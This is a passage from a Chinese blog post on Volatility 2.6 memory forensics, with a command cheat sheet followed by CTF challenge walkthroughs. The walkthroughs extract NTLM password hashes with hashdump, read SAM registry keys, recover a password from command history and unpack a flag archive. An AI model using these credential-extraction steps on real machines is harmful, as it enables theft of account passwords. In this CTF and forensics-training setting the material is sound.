class="hljs-comment">#显示包括隐藏dll的具体信息</span><br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] malfind -p[pid] <span class="hljs-comment">#找出注入的可执行代码或者DLL </span><br></code></pre></td></tr></table></figure><h3 id="0x08-根据PID导出程序"><a href="#0x08-根据PID导出程序" class="headerlink" title="0x08 - 根据PID导出程序"></a>0x08 - 根据PID导出程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] prodump -p [PID] -D [目录]<br></code></pre></td></tr></table></figure><h3 id="0x09-检查驱动程序"><a href="#0x09-检查驱动程序" class="headerlink" title="0x09 - 检查驱动程序"></a>0x09 - 检查驱动程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] modules<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] moddump -D [目录] --base [base地址]  <span class="hljs-comment">#提取驱动程序</span><br></code></pre></td></tr></table></figure><h3 id="0x10-查看开启的windows服务"><a href="#0x10-查看开启的windows服务" class="headerlink" title="0x10 - 查看开启的windows服务"></a>0x10 - 查看开启的windows服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] svcscan<br></code></pre></td></tr></table></figure><h3 id="0x10-查看注册表项"><a href="#0x10-查看注册表项" class="headerlink" title="0x10 - 查看注册表项"></a>0x10 - 查看注册表项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey<br></code></pre></td></tr></table></figure><h3 id="0x11-列出SAM表中的用户"><a href="#0x11-列出SAM表中的用户" class="headerlink" title="0x11 - 列出SAM表中的用户"></a>0x11 - 列出SAM表中的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SAM\Domains\Account\Users\Names&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x12-获取最后登录系统的用户"><a href="#0x12-获取最后登录系统的用户" class="headerlink" title="0x12 - 获取最后登录系统的用户"></a>0x12 - 获取最后登录系统的用户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] printkey -K <span class="hljs-string">&quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><br></code></pre></td></tr></table></figure><h3 id="0x13-查看注册表信息"><a href="#0x13-查看注册表信息" class="headerlink" title="0x13 - 查看注册表信息"></a>0x13 - 查看注册表信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivelist<br><br>vol.py -f &lt;镜像文件&gt; --profile=[profile文件] hivedump -o 0x93fc41e8(注册表的 virtual 地址)  <span class="hljs-comment">#导出注册表</span><br></code></pre></td></tr></table></figure><h3 id="0x14-获取浏览器浏览历史"><a href="#0x14-获取浏览器浏览历史" class="headerlink" title="0x14 - 获取浏览器浏览历史"></a>0x14 - 获取浏览器浏览历史</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] iehistory<br></code></pre></td></tr></table></figure><h3 id="0x15-查看时间线"><a href="#0x15-查看时间线" class="headerlink" title="0x15- 查看时间线"></a>0x15- 查看时间线</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vol.py -f &lt;镜像文件&gt; --profile=[profile文件] timeliner<br></code></pre></td></tr></table></figure><h2 id="CTF中的内存取证题"><a href="#CTF中的内存取证题" class="headerlink" title="CTF中的内存取证题"></a>CTF中的内存取证题</h2><h3 id="湖湘杯2020-passwd"><a href="#湖湘杯2020-passwd" class="headerlink" title="[湖湘杯2020] passwd"></a>[湖湘杯2020] passwd</h3><p>查看内存镜像的基本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root💀kali)-[/home/kali/volatility2.6]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                                                                         <br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/WIN-BU6IJ7FI9RU-20190927-152050.raw)                        <br>                      PAE <span class="hljs-built_in">type</span> : PAE                                                                                                    <br>                           DTB : 0x185000L                                                                                              <br>                          KDBG : 0x83f61c28L                                                                                            <br>          Number of Processors : 2                                                                                                      <br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0x83f62c00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0x807ca000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2019-09-27 15:20:52 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2019-09-27 23:20:52 +0800                                                                                                                                       <br></code></pre></td></tr></table></figure><p>根据Suggested Profile(s)值，猜测是Win7SP1x86_23418的镜像</p><p>查看password的hash值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(root💀kali)-[/home/kali/volatility2<span class="hljs-number">.6</span>]<br>└─<span class="hljs-comment"># vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br>CTF:<span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>a640404b5c386ab12092587fe19cd02:::<br></code></pre></td></tr></table></figure><p>对CTF用户的值，在线网站破解hash<br><img src="https://img-blog.csdnimg.cn/20210601130636808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="NEWSCTF2021-very-ez-dump"><a href="#NEWSCTF2021-very-ez-dump" class="headerlink" title="[NEWSCTF2021] very-ez-dump"></a>[NEWSCTF2021] very-ez-dump</h3><p>查看镜像信息，判断是Win7SP1x64镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw imageinfo                                                    <br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/mem.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf8000403e0a0L<br>          Number of Processors : 2<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff8000403fd00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image date and time : 2021-05-20 13:08:33 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2021-05-20 21:08:33 +0800<br></code></pre></td></tr></table></figure><p>列出进程，没看到什么有价值的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 pslist                                 <br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0xfffffa8000cb2040 System                    4      0     91      519 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80016bbb30 smss.exe                256      4      2       30 ------      0 2021-05-20 11:21:48 UTC+0000                                 <br>0xfffffa80023c7b30 csrss.exe               348    328      9      437      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa80025c3060 wininit.exe             400    328      3       81      0      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa8001b6f060 csrss.exe               412    392     10      252      1      0 2021-05-20 11:21:49 UTC+0000                                 <br>0xfffffa800262e7c0 winlogon.exe            464    392      5      121      1      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800260ab30 services.exe            484    400      9      206      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002674a90 lsass.exe               516    400     10      573      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa800267f060 lsm.exe                 524    400     10      142      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa8002607b30 svchost.exe             640    484     11      359      0      0 2021-05-20 11:21:50 UTC+0000                                 <br>0xfffffa80026af6a0 svchost.exe             720    484      9      292      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002735b30 svchost.exe             792    484     22      498      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa800275a060 svchost.exe             844    484     11      258      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002776960 svchost.exe             892    484     34      969      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027b5b30 svchost.exe            1000    484     17      698      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa80027dab30 svchost.exe             368    484     15      371      0      0 2021-05-20 11:21:51 UTC+0000                                 <br>0xfffffa8002858b30 spoolsv.exe            1040    484     12      272      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800286bb30 svchost.exe            1072    484     18      331      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa8002938b30 VGAuthService.         1228    484      3       87      0      0 2021-05-20 11:21:52 UTC+0000                                 <br>0xfffffa800297ab30 taskhost.exe           1344    484      9      175      1      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa8002650b30 vmtoolsd.exe           1404    484     11      278      0      0 2021-05-20 11:21:53 UTC+0000                                 <br>0xfffffa80029a9b30 dwm.exe                1648    844      5      149      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002a47b30 explorer.exe           1700   1596     44     1219      1      0 2021-05-20 11:21:54 UTC+0000                                 <br>0xfffffa8002b0eb30 WmiPrvSE.exe           1920    640      9      217      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002af06c0 dllhost.exe            1996    484     13      197      0      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b93520 vm3dservice.ex          864   1700      2       41      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8002b3e060 vmtoolsd.exe           1296   1700      9      193      1      0 2021-05-20 11:21:55 UTC+0000                                 <br>0xfffffa8000d60060 msdtc.exe               520    484     12      146      0      0 2021-05-20 11:21:58 UTC+0000                                 <br>0xfffffa8002c42440 SearchIndexer.         2208    484     13      600      0      0 2021-05-20 11:22:01 UTC+0000                                 <br>0xfffffa8002d23880 wmpnetwk.exe           2360    484      9      214      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa8002da6b30 svchost.exe            2520    484     15      258      0      0 2021-05-20 11:22:02 UTC+0000                                 <br>0xfffffa800142d400 sppsvc.exe             2500    484      4      150      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa8002d90060 svchost.exe            2408    484     13      343      0      0 2021-05-20 11:23:54 UTC+0000                                 <br>0xfffffa800104ab30 audiodg.exe            2236    792      7      141      0      0 2021-05-20 11:33:37 UTC+0000                                 <br>0xfffffa80010c7060 cmd.exe                2624   1700      1       21      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8000d81550 conhost.exe            1588    412      2       62      1      0 2021-05-20 13:04:35 UTC+0000                                 <br>0xfffffa8001044710 SearchProtocol         2580   2208      8      285      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa80010db9b0 SearchFilterHo          316   2208      5       96      0      0 2021-05-20 13:08:04 UTC+0000                                 <br>0xfffffa8001a29680 dllhost.exe            1888    640      6       87      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa8002c78060 dllhost.exe            1252    640      6       83      0      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa800142f060 DumpIt.exe             2864   1700      1       25      1      1 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e2060 conhost.exe            2824    412      2       61      1      0 2021-05-20 13:08:32 UTC+0000                                 <br>0xfffffa80010e6860 dllhost.exe            2696    640      6       69      1      0 2021-05-20 13:08:34 UTC+0000          <br></code></pre></td></tr></table></figure><p>看下password的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 hashdump<br>Volatility Foundation Volatility Framework 2.6<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:1507e24d634a54c0b14750a7da2bdfdb:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:c22b315c040ae6e0efee3518d830362b:::<br>mumuzi:1000:aad3b435b51404eeaad3b435b51404ee:0606ac59df4a10d3a9e1f97b3612546f:::                                                                                                                                                                      <br></code></pre></td></tr></table></figure><p>mumuzi用户的密码破解不出来，继续往下看</p><p>查看cmd下执行的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 cmdscan<br>Volatility Foundation Volatility Framework 2.6<br>**************************************************<br>CommandProcess: conhost.exe Pid: 1588<br>CommandHistory: 0x117120 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 13 LastAdded: 12 LastDisplayed: 12<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x109cf0: dir</span><br>Cmd <span class="hljs-comment">#1 @ 0x108290: ipconfig</span><br>Cmd <span class="hljs-comment">#2 @ 0xf8bd0: ipconfig 192.168.26.2</span><br>Cmd <span class="hljs-comment">#3 @ 0x116aa0: ping newsctf.top</span><br>Cmd <span class="hljs-comment">#4 @ 0x1082d0: network</span><br>Cmd <span class="hljs-comment">#5 @ 0x1082f0: net user</span><br>Cmd <span class="hljs-comment">#6 @ 0xf8c50: net user Guest 123456789</span><br>Cmd <span class="hljs-comment">#7 @ 0xf8c90: net user mumuzi (ljmmz)ovo</span><br>Cmd <span class="hljs-comment">#8 @ 0x108350: clear</span><br>Cmd <span class="hljs-comment">#9 @ 0x116a40: if_you_see_it,</span><br>Cmd <span class="hljs-comment">#10 @ 0xf8cd0: you_will_find_the_flag</span><br>Cmd <span class="hljs-comment">#11 @ 0x116ad0: where_is_the_flag?</span><br>Cmd <span class="hljs-comment">#12 @ 0x1178d0: net user Administrator flag_not_here</span><br>Cmd <span class="hljs-comment">#29 @ 0x90158: </span><br>Cmd <span class="hljs-comment">#30 @ 0x10f920: </span><br>**************************************************<br>CommandProcess: conhost.exe Pid: 2824<br>CommandHistory: 0x357140 Application: DumpIt.exe Flags: Allocated<br>CommandCount: 0 LastAdded: -1 LastDisplayed: -1<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#29 @ 0x2d0158: 5</span><br>Cmd <span class="hljs-comment">#30 @ 0x34f940: 4</span><br></code></pre></td></tr></table></figure><p>这条指令net user mumuzi (ljmmz)ovo  ，添加了一个用户mumuzi，密码是(ljmmz)ovo，继续往下看</p><p>查看文件，用grep命令查找含flag的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 filescan  | grep flag     <br>Volatility Foundation Volatility Framework 2.6<br>0x000000003e4b2070      2      0 -W-rwd \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br>0x000000003fa56dd0      2      0 RW-rw- \Device\HarddiskVolume1\Users\mumuzi\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk<br></code></pre></td></tr></table></figure><p>看到一个flag.zip，dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f mem.raw  --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D news               <span class="hljs-comment">#-Q是偏移量，-D是存储的文件夹                                                            </span><br>Volatility Foundation Volatility Framework 2.6<br>DataSectionObject 0x3e4b2070   None   \Device\HarddiskVolume1\galf\fl^ag.zipesktop\fl^ag.zipp\vmware-mumuzi\VMwareDnD\9451fe4f\flag.zip<br></code></pre></td></tr></table></figure><p>带密码的压缩包，密码就是上面的(ljmmz)ovo，解压得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;ez_di_imp_1t_y0u_like?&#125;<br></code></pre></td></tr></table></figure><h3 id="福莱格殿下"><a href="#福莱格殿下" class="headerlink" title="福莱格殿下"></a>福莱格殿下</h3><p>参考：<a href="https://blog.csdn.net/weixin_43891422/article/details/107852416">https://blog.csdn.net/weixin_43891422/article/details/107852416</a></p><p>1.查看内存镜像信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw imageinfo<br>Volatility Foundation Volatility Framework 2.6<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)<br>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/home/kali/volatility2.6/zy.raw)<br>                      PAE <span class="hljs-built_in">type</span> : PAE<br>                           DTB : 0xaff000L<br>                          KDBG : 0x80546ae0L<br>          Number of Processors : 1<br>     Image Type (Service Pack) : 3<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xffdff000L<br>             KUSER_SHARED_DATA : 0xffdf0000L<br>           Image date and time : 2020-07-25 16:50:35 UTC+0000<br>     Image <span class="hljs-built_in">local</span> date and time : 2020-07-26 00:50:35 +0800<br></code></pre></td></tr></table></figure><p>镜像系统为WinXPSP2x86</p><p>2.获取进程信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  pslist<br>Volatility Foundation Volatility Framework 2.6<br>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <br>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>0x821b9830 System                    4      0     58      254 ------      0                                                              <br>0x81c04ba0 smss.exe                536      4      3       19 ------      0 2020-07-25 15:35:26 UTC+0000                                 <br>0x81f59da0 csrss.exe               604    536     11      365      0      0 2020-07-25 15:35:29 UTC+0000                                 <br>0x82007d10 winlogon.exe            632    536     18      451      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x82085560 services.exe            716    632     16      269      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81c944a8 lsass.exe               728    632     22      355      0      0 2020-07-25 15:35:31 UTC+0000                                 <br>0x81f767f0 vmacthlp.exe            904    716      1       25      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x82054988 svchost.exe             916    716     15      189      0      0 2020-07-25 15:35:32 UTC+0000                                 <br>0x81c1e2a0 svchost.exe             964    716     11      254      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81d57360 svchost.exe            1104    716     55     1147      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bc5458 svchost.exe            1152    716      4       77      0      0 2020-07-25 15:35:33 UTC+0000                                 <br>0x81bcf650 svchost.exe            1192    716     14      198      0      0 2020-07-25 15:35:35 UTC+0000                                 <br>0x81d61650 explorer.exe           1596   1540     16      536      0      0 2020-07-25 15:35:39 UTC+0000                                 <br>0x82006da0 spoolsv.exe            1700    716     10      114      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81ffda48 rundll32.exe           1808   1596      4       78      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x8200a7e0 vmtoolsd.exe           1816   1596      7      246      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81d87c10 ctfmon.exe             1824   1596      1       71      0      0 2020-07-25 15:35:40 UTC+0000                                 <br>0x81feabb8 svchost.exe            1784    716      4       84      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81c96790 VGAuthService.e        1996    716      2       60      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81bf0c10 vmtoolsd.exe            176    716      7      267      0      0 2020-07-25 15:35:56 UTC+0000                                 <br>0x81fe0578 wmiprvse.exe           1040    916     13      237      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81c395a8 wscntfy.exe            1188   1104      1       39      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81bb3498 alg.exe                1552    716      5      102      0      0 2020-07-25 15:36:04 UTC+0000                                 <br>0x81d89da0 notepad.exe            1352   1596      2       92      0      0 2020-07-25 15:38:22 UTC+0000                                 <br>0x8206fda0 conime.exe             1832   1320      1       38      0      0 2020-07-25 15:49:44 UTC+0000                                 <br>0x81d89a08 DumpIt.exe              800   1596      1       25      0      0 2020-07-25 16:50:34 UTC+0000   <br></code></pre></td></tr></table></figure><p>可疑程序smss.exe</p><p>3.提取进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ vol.py -f zy.raw --profile=WinXPSP2x86  memdump -p 536 -D ./  <br>Volatility Foundation Volatility Framework 2.6<br>************************************************************************<br>Writing smss.exe [   536] to 536.dmp<br></code></pre></td></tr></table></figure><p>4.查看dump信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/volatility2.6]<br>└─$ strings -e l 536.dmp | grep 